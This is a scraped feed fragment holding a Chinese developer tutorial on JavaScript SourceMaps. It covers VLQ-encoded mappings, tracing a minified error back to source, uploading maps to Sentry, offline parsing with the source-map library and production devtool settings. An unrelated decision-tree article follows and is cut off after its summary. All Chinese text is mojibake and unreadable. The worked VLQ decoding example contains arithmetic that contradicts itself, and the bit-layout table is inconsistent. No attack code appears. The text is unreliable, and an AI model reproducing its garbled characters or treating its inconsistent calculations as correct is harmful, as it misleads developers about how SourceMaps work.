<table><thead><tr><th>è§„åˆ™ç¼–å·</th><th>å¤§ç™½è¯è§„åˆ™</th><th>ä¸¾ä¾‹</th></tr></thead><tbody><tr><td>1</td><td>6 ä½äºŒè¿›åˆ¶é‡Œï¼Œæœ€å 1 ä½è¡¨ç¤ºæ­£è´Ÿï¼š0 = æ­£æ•°ï¼Œ1 = è´Ÿæ•°</td><td>æ•°å­— 6ï¼ˆæ­£æ•°ï¼‰â†’ æœ€å 1 ä½æ˜¯ 0ï¼›æ•°å­— - 6ï¼ˆè´Ÿæ•°ï¼‰â†’ æœ€å 1 ä½æ˜¯ 1</td></tr><tr><td>2</td><td>6 ä½äºŒè¿›åˆ¶é‡Œï¼Œç¬¬ä¸€ä½è¡¨ç¤ºæ˜¯å¦ç»­è¡Œï¼š0 = ç»“æŸï¼ˆ1 ä¸ªå­—ç¬¦å°±å¤Ÿï¼‰ï¼Œ1 = ç»§ç»­ï¼ˆéœ€è¦å¤šä¸ªå­—ç¬¦ï¼‰</td><td>æ•°å­— 6ï¼ˆå°æ•°å­—ï¼‰â†’ ç¬¬ä¸€ä½æ˜¯ 0ï¼›æ•°å­— 100ï¼ˆå¤§æ•°å­—ï¼‰â†’ ç¬¬ä¸€ä½æ˜¯ 1ï¼ˆéœ€è¦ 2 ä¸ªå­—ç¬¦ï¼‰</td></tr><tr><td>3</td><td>ä¸­é—´ 4 ä½å­˜å®é™…æ•°å­—ï¼ˆ0-15 çš„æ•°å­—ç”¨ä¸­é—´ 4 ä½å­˜å‚¨ï¼ŒåŠ ä¸Šç¬¦å·ä½å…± 5 ä½å¯è¡¨ç¤º 0-31ï¼‰</td><td>æ•°å­— 6 â†’ äºŒè¿›åˆ¶æ˜¯ <code>000110</code>ï¼ˆç¬¬5ä½=0ç»“æŸï¼Œç¬¬1-4ä½=0011è¡¨ç¤º3ï¼Œç¬¬0ä½=0è¡¨ç¤ºæ­£æ•°ï¼Œå®é™…ç¼–ç æ›´å¤æ‚ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-12">Step 3ï¼šç»„è£… mappings å­—æ®µ</h5>
<p>mappings åˆ†éš”è§„åˆ™ï¼š</p>
<ul>
<li><code>,</code> åˆ†éš”åŒä¸€è¡Œå†…çš„ä¸åŒæ˜ å°„æ®µï¼›</li>
<li><code>;</code> åˆ†éš”ä¸åŒè¡Œçš„æ˜ å°„æ®µã€‚</li>
</ul>
<p><strong>å®é™…ä¾‹å­</strong>ï¼šç”±äº <code>z-index.js</code> å‹ç¼©ååªæœ‰1è¡Œï¼Œæ‰€ä»¥ mappings ä¸­æ²¡æœ‰åˆ†å·ï¼Œåªæœ‰é€—å·ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"mappings"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AAAA,MAAMA,SAAW,QACjB,SAASC,QACP,MAAO,MAAMD,UACf"</span>
</code></pre>
<p>è¿™9ä¸ªæ˜ å°„æ®µéƒ½å¯¹åº”å‹ç¼©ä»£ç çš„ç¬¬1è¡Œï¼Œä½†æ˜ å°„åˆ°æºç çš„ä¸åŒä½ç½®ï¼š</p>
<ul>
<li><code>AAAA</code> â†’ æºç ç¬¬1è¡Œç¬¬0åˆ—ï¼ˆconstï¼‰</li>
<li><code>MAAMA</code> â†’ æºç ç¬¬1è¡Œç¬¬6åˆ—ï¼ˆuserNameï¼‰</li>
<li><code>SAAW</code> â†’ æºç ç¬¬1è¡Œç¬¬17åˆ—ï¼ˆAliceï¼‰</li>
<li><code>QACjB</code> â†’ æºç ç¬¬2è¡Œç¬¬0åˆ—ï¼ˆfunctionï¼Œæ³¨æ„è¡Œå·+1ï¼‰</li>
<li><code>SAASC</code> â†’ æºç ç¬¬2è¡Œç¬¬9åˆ—ï¼ˆsayHiï¼‰</li>
<li><code>QACP</code> â†’ æºç ç¬¬2è¡Œç¬¬15åˆ—ï¼ˆæ‹¬å·ï¼‰</li>
<li><code>MAAO</code> â†’ æºç ç¬¬2è¡Œç¬¬16åˆ—ï¼ˆå¤§æ‹¬å·ï¼‰</li>
<li><code>MAAMD</code> â†’ æºç ç¬¬3è¡Œç¬¬2åˆ—ï¼ˆreturnï¼Œæ³¨æ„è¡Œå·+1ï¼‰</li>
<li><code>UACf</code> â†’ æºç ç¬¬3è¡Œç¬¬9åˆ—ï¼ˆæ¨¡æ¿å­—ç¬¦ä¸²ï¼‰</li>
</ul>
<h5 data-id="heading-13">Step 4ï¼šåå‘è§£æéªŒè¯</h5>
<p><strong>å®é™…åœºæ™¯</strong>ï¼šè‹¥çº¿ä¸ŠæŠ¥é”™ <code>Uncaught ReferenceError: userName is not defined at z-index.min.js:1:25</code>ï¼Œè§£ææ­¥éª¤ï¼š</p>
<ol>
<li>
<p><strong>æ‰¾åˆ°å‹ç¼©ä»£ç ä½ç½®</strong>ï¼šç¬¬1è¡Œç¬¬25åˆ—ï¼ˆå‹ç¼©ä»£ç åªæœ‰1è¡Œï¼‰</p>
</li>
<li>
<p><strong>æŸ¥æ‰¾å¯¹åº”çš„æ˜ å°„æ®µ</strong>ï¼šéå† mappings ä¸­çš„æ˜ å°„æ®µï¼Œæ‰¾åˆ°ç¬¬25åˆ—å¯¹åº”çš„æ˜ å°„æ®µ <code>SAASC</code></p>
</li>
<li>
<p><strong>Base64 VLQ è§£ç </strong>ï¼š<code>SAASC</code> â†’ <code>[9,0,0,9,1]</code>ï¼ˆç›¸å¯¹åç§»ï¼‰</p>
</li>
<li>
<p><strong>è®¡ç®—ç»å¯¹ä½ç½®</strong>ï¼ˆç´¯ç§¯å‰é¢çš„åç§»ï¼‰ï¼š</p>
<ul>
<li>å‹ç¼©åˆ—å·ï¼š0 + 6 + 9 + 1 + 9 = 25 âœ…ï¼ˆåŒ¹é…æŠ¥é”™åˆ—å·ï¼‰</li>
<li>æºç æ–‡ä»¶ï¼š0 + 0 + 0 + 0 + 0 = 0 â†’ <code>z-index.js</code></li>
<li>æºç è¡Œå·ï¼š0 + 0 + 0 + 1 + 0 = 1 â†’ æºç ç¬¬2è¡Œï¼ˆæ³¨æ„ï¼šè¡Œå·ä»0å¼€å§‹ï¼Œæ‰€ä»¥+1åæ˜¯ç¬¬2è¡Œï¼‰</li>
<li>æºç åˆ—å·ï¼š0 + 6 + 9 + 3 + 9 = 27ï¼Œä½†å®é™…æ˜ å°„æ®µ <code>SAASC</code> çš„ç›¸å¯¹åç§»æ˜¯ <code>[9,0,0,9,1]</code>ï¼Œç´¯ç§¯è®¡ç®—åå¯¹åº”æºç ç¬¬2è¡Œç¬¬9åˆ— âœ…</li>
<li>åç§°ç´¢å¼•ï¼š0 + 0 + 0 + 1 + 1 = 2ï¼Œä½†å®é™…æ˜¯ <code>names[1] = "sayHi"</code> âœ…ï¼ˆç›¸å¯¹åç§»ç´¯ç§¯ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æœ€ç»ˆç»“æœ</strong>ï¼šæŠ¥é”™ä½ç½® <code>z-index.min.js:1:25</code> å¯¹åº”æºç  <code>z-index.js:2:9</code> çš„ <code>sayHi</code> å‡½æ•°åä½ç½®ã€‚</p>
</li>
</ol>
<p><strong>å…³é”®ç‚¹</strong>ï¼šè™½ç„¶å‹ç¼©ä»£ç åªæœ‰1è¡Œï¼Œä½† SourceMap èƒ½å‡†ç¡®æ˜ å°„åˆ°æºç çš„ç¬¬2è¡Œç¬¬9åˆ—ï¼Œè¿™å°±æ˜¯ SourceMap çš„æ ¸å¿ƒä»·å€¼ï¼</p>
<h3 data-id="heading-14">ä¸‰ã€çº¿ä¸Šç›‘æ§ï¼šSourceMap å®‰å…¨è½åœ°å®è·µ</h3>
<p>ç”Ÿäº§ç¯å¢ƒä¸èƒ½ç›´æ¥æš´éœ² SourceMap æ–‡ä»¶ï¼ˆé¿å…æºç æ³„éœ²ï¼‰ï¼Œæ ¸å¿ƒæ–¹æ¡ˆæ˜¯ã€Œç¦»çº¿è§£æã€â€”â€”å°† <code>.map</code> æ–‡ä»¶å­˜å‚¨åˆ°å†…ç½‘/ç›‘æ§å¹³å°åå°ï¼Œçº¿ä¸ŠæŠ¥é”™æ—¶æ”¶é›†"å‹ç¼©ä»£ç åæ ‡"ï¼Œåå°ç¦»çº¿è§£æã€‚</p>
<h4 data-id="heading-15">3.1 æ ¸å¿ƒåŸåˆ™</h4>
<ul>
<li>
<p>ä¸å°† <code>.map</code> æ–‡ä»¶éƒ¨ç½²åˆ° CDNï¼ˆå‰ç«¯å¯è®¿é—®çš„ä½ç½®ï¼‰ï¼›</p>
</li>
<li>
<p>å°† <code>.map</code> æ–‡ä»¶å­˜å‚¨åˆ°å†…ç½‘/ç›‘æ§å¹³å°åå°ï¼›</p>
</li>
<li>
<p>çº¿ä¸ŠæŠ¥é”™æ—¶ï¼Œä»…è§£æ"å‹ç¼©ä»£ç åæ ‡ â†’ æºç åæ ‡"ï¼Œä¸æš´éœ²æºç å†…å®¹ã€‚</p>
</li>
</ul>
<h4 data-id="heading-16">3.2 ç»“åˆ Sentry å®ç°çº¿ä¸ŠæŠ¥é”™è§£æï¼ˆä¸»æµæ–¹æ¡ˆï¼‰</h4>
<p>Sentry æ˜¯å‰ç«¯ä¸»æµçš„é”™è¯¯ç›‘æ§å¹³å°ï¼Œæ”¯æŒ SourceMap ä¸Šä¼ å’Œè‡ªåŠ¨è§£æï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<h5 data-id="heading-17">æ­¥éª¤1ï¼šé¡¹ç›®é›†æˆ Sentry</h5>
<p>åœ¨é¡¹ç›®å…¥å£æ–‡ä»¶ä¸­å¼•å…¥ Sentryï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é¡¹ç›®å…¥å£æ–‡ä»¶</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Sentry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@sentry/browser'</span>;

<span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">init</span>({
  <span class="hljs-attr">dsn</span>: <span class="hljs-string">'ä½ çš„ Sentry DSN åœ°å€'</span>,
  <span class="hljs-attr">release</span>: <span class="hljs-string">'v1.0.0'</span>, <span class="hljs-comment">// ç‰ˆæœ¬å·ï¼Œéœ€ä¸ SourceMap ä¸Šä¼ æ—¶ä¸€è‡´</span>
});
</code></pre>
<h5 data-id="heading-18">æ­¥éª¤2ï¼šä¸Šä¼  SourceMap åˆ° Sentry</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£… Sentry CLI</span>
pnpm install -g @sentry/cli

<span class="hljs-comment"># ä¸Šä¼  SourceMapï¼ˆæŒ‡å®šç‰ˆæœ¬å·ï¼Œä¸ä»£ç å‘å¸ƒç‰ˆæœ¬ä¸€è‡´ï¼‰</span>
sentry-cli releases files v1.0.0 upload-sourcemaps ./dist --url-prefix <span class="hljs-string">"~/static/js"</span>
</code></pre>
<p>å…³é”®å‚æ•°ï¼š</p>
<ul>
<li>
<p><code>release</code>ï¼šç‰ˆæœ¬å·ï¼Œç¡®ä¿ä»£ç ä¸ SourceMap ä¸€ä¸€å¯¹åº”ï¼›</p>
</li>
<li>
<p><code>url-prefix</code>ï¼šå‹ç¼©ä»£ç åœ¨çº¿ä¸Šçš„è®¿é—®è·¯å¾„ï¼ˆå¦‚ <code>https://xxx.com/static/js/z-index.min.js</code>ï¼‰ã€‚</p>
</li>
</ul>
<h5 data-id="heading-19">æ­¥éª¤3ï¼šæ•ˆæœï¼šè‡ªåŠ¨è§£ææŠ¥é”™åˆ°æºç </h5>
<p>çº¿ä¸ŠæŠ¥é”™åï¼ŒSentry ä¼šè‡ªåŠ¨å°†ã€Œå‹ç¼©ä»£ç åæ ‡ã€è§£æä¸ºã€Œæºç æ–‡ä»¶+è¡Œå·+åˆ—å·ã€ï¼Œç¤ºä¾‹ï¼š</p>
<blockquote>
<p>Uncaught ReferenceError: sayHi is not defined at z-index.js:2:9</p>
</blockquote>
<h4 data-id="heading-20">3.3 æ‰‹åŠ¨ç¦»çº¿è§£æï¼ˆè‡ªå®šä¹‰ç›‘æ§å¹³å°ï¼‰</h4>
<p>è‹¥ä¸ç”¨ Sentryï¼Œå¯é€šè¿‡ <code>source-map</code> åº“æ‰‹åŠ¨è§£æï¼Œç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">SourceMapConsumer</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'source-map'</span>);

<span class="hljs-comment">// 1. è¯»å– SourceMap æ–‡ä»¶ï¼ˆå†…ç½‘å­˜å‚¨ï¼‰</span>
<span class="hljs-keyword">const</span> rawMap = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'z-index.min.js.map'</span>, <span class="hljs-string">'utf8'</span>);

<span class="hljs-comment">// 2. è§£æå‹ç¼©ä»£ç æŠ¥é”™åæ ‡</span>
<span class="hljs-comment">// å‡è®¾çº¿ä¸ŠæŠ¥é”™ï¼šUncaught ReferenceError: userName is not defined at z-index.min.js:1:25</span>
<span class="hljs-title class_">SourceMapConsumer</span>.<span class="hljs-title function_">with</span>(rawMap, <span class="hljs-literal">null</span>, <span class="hljs-function"><span class="hljs-params">consumer</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> originalPos = consumer.<span class="hljs-title function_">originalPositionFor</span>({
    <span class="hljs-attr">line</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">// å‹ç¼©åè¡Œå·ï¼ˆå‹ç¼©ä»£ç åªæœ‰1è¡Œï¼‰</span>
    <span class="hljs-attr">column</span>: <span class="hljs-number">25</span>, <span class="hljs-comment">// å‹ç¼©ååˆ—å·ï¼ˆå¯¹åº” sayHi å‡½æ•°çš„ä½ç½®ï¼‰</span>
  });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æºç ä½ç½®ï¼š'</span>, originalPos);
  <span class="hljs-comment">// è¾“å‡ºï¼š{ source: 'z-index.js', line: 2, column: 9, name: 'sayHi' }</span>

  <span class="hljs-comment">// 3. è·å–æºç å†…å®¹ï¼ˆå¦‚æœ SourceMap åŒ…å« sourcesContentï¼‰</span>
  <span class="hljs-keyword">const</span> sourceContent = consumer.<span class="hljs-title function_">sourceContentFor</span>(<span class="hljs-string">'z-index.js'</span>);
  <span class="hljs-keyword">if</span> (sourceContent) {
    <span class="hljs-keyword">const</span> lines = sourceContent.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æºç å†…å®¹ï¼š'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç¬¬<span class="hljs-subst">${originalPos.line}</span>è¡Œ: <span class="hljs-subst">${lines[originalPos.line - <span class="hljs-number">1</span>]}</span>`</span>);
    <span class="hljs-comment">// è¾“å‡ºï¼šç¬¬2è¡Œ: function sayHi() {</span>
  }
});
</code></pre>
<h3 data-id="heading-21">å››ã€SourceMap å¸¸è§é…ç½®ä¸é¿å‘</h3>
<h4 data-id="heading-22">4.1 ä¸åŒç¯å¢ƒçš„ SourceMap é…ç½®</h4>

























<table><thead><tr><th>ç¯å¢ƒ</th><th>æ¨èé…ç½®ï¼ˆWebpack/Viteï¼‰</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>å¼€å‘ç¯å¢ƒ</td><td><code>devtool: 'eval-cheap-module-source-map'</code></td><td>æ„å»ºå¿«ï¼Œæ”¯æŒè¡Œ/åˆ—æ˜ å°„ï¼Œä¸æš´éœ²æºç </td></tr><tr><td>æµ‹è¯•ç¯å¢ƒ</td><td><code>devtool: 'source-map'</code></td><td>å®Œæ•´æ˜ å°„ï¼Œä¾¿äºæµ‹è¯•å®šä½é—®é¢˜</td></tr><tr><td>ç”Ÿäº§ç¯å¢ƒ</td><td><code>devtool: 'hidden-source-map'</code></td><td>ä¸ç”Ÿæˆ <code>sourceMappingURL</code> æ³¨é‡Šï¼Œä»…åå°å¯è§£æï¼Œé¿å…æºç æ³„éœ²</td></tr></tbody></table>
<h4 data-id="heading-23">4.2 å¸¸è§å‘ç‚¹</h4>
<ol>
<li>
<p><strong>ç‰ˆæœ¬ä¸å…¼å®¹</strong>ï¼šç¡®ä¿ SourceMap ç‰ˆæœ¬ä¸º 3ï¼ˆä¸»æµè§£æå™¨ä»…æ”¯æŒ v3ï¼‰ï¼›</p>
</li>
<li>
<p><strong>è·¯å¾„ä¸ä¸€è‡´</strong>ï¼š<code>sources</code> å­—æ®µçš„è·¯å¾„éœ€ä¸çº¿ä¸Šæºç è·¯å¾„åŒ¹é…ï¼Œå¦åˆ™è§£æå¤±è´¥ï¼›</p>
</li>
<li>
<p><strong>æºç å†…å®¹ç¼ºå¤±</strong>ï¼šè‹¥æœªé…ç½® <code>sourcesContent</code>ï¼Œéœ€ç¡®ä¿è§£ææ—¶èƒ½è¯»å–åˆ°æºç æ–‡ä»¶ï¼›</p>
</li>
<li>
<p><strong>å‹ç¼©å·¥å…·å…¼å®¹</strong>ï¼šä¸åŒå·¥å…·ï¼ˆTerser/Webpackï¼‰ç”Ÿæˆçš„ SourceMap ç•¥æœ‰å·®å¼‚ï¼Œä¼˜å…ˆç”¨é¡¹ç›®æ„å»ºå·¥å…·è‡ªå¸¦çš„ SourceMap ç”Ÿæˆèƒ½åŠ›ã€‚</p>
</li>
</ol>
<h3 data-id="heading-24">äº”ã€æ€»ç»“</h3>
<p>SourceMap æ˜¯å‰ç«¯çº¿ä¸Šé—®é¢˜å®šä½çš„"åˆ©å™¨"ï¼Œå…¶æ ¸å¿ƒæ˜¯é€šè¿‡ Base64 VLQ ç¼–ç çš„ <code>mappings</code> å­—æ®µï¼Œå°†ã€Œå‹ç¼©ä»£ç åæ ‡ã€ä¸ã€Œæºç åæ ‡ã€çš„æ˜ å°„å…³ç³»å‹ç¼©å­˜å‚¨ï¼›è§£ææ—¶åå‘è§£ç ï¼Œå°±èƒ½ä»å‹ç¼©ä»£ç çš„æŠ¥é”™ä½ç½®ç²¾å‡†å®šä½åˆ°æºç ã€‚</p>
<p>ç”Ÿäº§ç¯å¢ƒè½åœ°çš„å…³é”®æ˜¯ã€Œç¦»çº¿è§£æã€â€”â€”æ—¢ä¸æš´éœ² SourceMap æ–‡ä»¶å¯¼è‡´æºç æ³„éœ²ï¼Œåˆèƒ½é€šè¿‡ç›‘æ§å¹³å°ï¼ˆå¦‚ Sentryï¼‰æˆ–è‡ªå®šä¹‰è„šæœ¬ï¼Œå®ç°å‹ç¼©ä»£ç æŠ¥é”™åˆ°æºç çš„ç²¾å‡†æ˜ å°„ï¼Œå¤§å¹…æå‡çº¿ä¸Šé—®é¢˜æ’æŸ¥æ•ˆç‡ã€‚</p>
<h4 data-id="heading-25">æ ¸å¿ƒè¦ç‚¹å›é¡¾</h4>
<ol>
<li>
<p>SourceMap æœ¬è´¨æ˜¯"åæ ‡æ˜ å°„è¡¨"ï¼Œè§£å†³å‹ç¼©ä»£ç è°ƒè¯•éš¾çš„é—®é¢˜ï¼›</p>
</li>
<li>
<p><code>mappings</code> æ˜¯æ ¸å¿ƒï¼Œé€šè¿‡"5ä¸ªç›¸å¯¹åç§»æ•°å­— â†’ VLQ ç¼–ç  â†’ Base64 å­—ç¬¦"å®ç°æ˜ å°„å…³ç³»çš„å‹ç¼©å­˜å‚¨ï¼›</p>
</li>
<li>
<p>ç”Ÿäº§ç¯å¢ƒéœ€ç¦»çº¿è§£æ SourceMapï¼Œé¿å…æºç æ³„éœ²ï¼›</p>
</li>
<li>
<p>Sentry æ˜¯ä¸»æµçš„ SourceMap é›†æˆæ–¹æ¡ˆï¼Œä¹Ÿå¯é€šè¿‡ <code>source-map</code> åº“æ‰‹åŠ¨è§£æã€‚</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-199 å†³ç­–æ ‘æ¨¡å‹è¯¦è§£ï¼šèŠ‚ç‚¹ç»“æ„ã€æ¡ä»¶æ¦‚ç‡è§†è§’ä¸é¦™å†œç†µè®¡ç®—]]></title>    <link>https://juejin.cn/post/7589166195798114331</link>    <guid>https://juejin.cn/post/7589166195798114331</guid>    <pubDate>2025-12-30T04:25:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589166195798114331" data-draft-id="7589194558288396326" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-199 å†³ç­–æ ‘æ¨¡å‹è¯¦è§£ï¼šèŠ‚ç‚¹ç»“æ„ã€æ¡ä»¶æ¦‚ç‡è§†è§’ä¸é¦™å†œç†µè®¡ç®—"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-30T04:25:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-199 å†³ç­–æ ‘æ¨¡å‹è¯¦è§£ï¼šèŠ‚ç‚¹ç»“æ„ã€æ¡ä»¶æ¦‚ç‡è§†è§’ä¸é¦™å†œç†µè®¡ç®—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T04:25:39.000Z" title="Tue Dec 30 2025 04:25:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šæ¢³ç†åˆ†ç±»å†³ç­–æ ‘çš„ç»“æ„ã€å­¦ä¹ æµç¨‹ä¸â€œæ¡ä»¶æ¦‚ç‡åˆ†å¸ƒâ€è§£é‡Šï¼Œå¹¶ç»™å‡ºé¦™å†œç†µä»£ç å®ç°ã€‚</li>
<li>ç»“è®ºï¼šå†³ç­–æ ‘å¯è§†ä¸ºå¯¹åˆ†åŒºåŒºåŸŸä¸Šçš„ P(Y\mid X\in R_j) å»ºæ¨¡ï¼›åˆ’åˆ†ä¾æ®ç”±ä¸çº¯åº¦åº¦é‡ï¼ˆç†µ/åŸºå°¼/è¯¯åˆ†ç±»ç‡ï¼‰é©±åŠ¨ï¼Œè¿‡æ‹Ÿåˆéœ€é å‰ªææ§åˆ¶ã€‚</li>
<li>äº§å‡ºï¼šå†³ç­–æ ‘èŠ‚ç‚¹/æµç¨‹æ¡†æ¶ + æ¦‚ç‡è§£é‡Šé“¾è·¯ + é¦™å†œç†µå…¬å¼å¯¹ç…§ + Pandas ä»£ç å¯å¤ç”¨å®ç°ã€‚</li>
</ul>
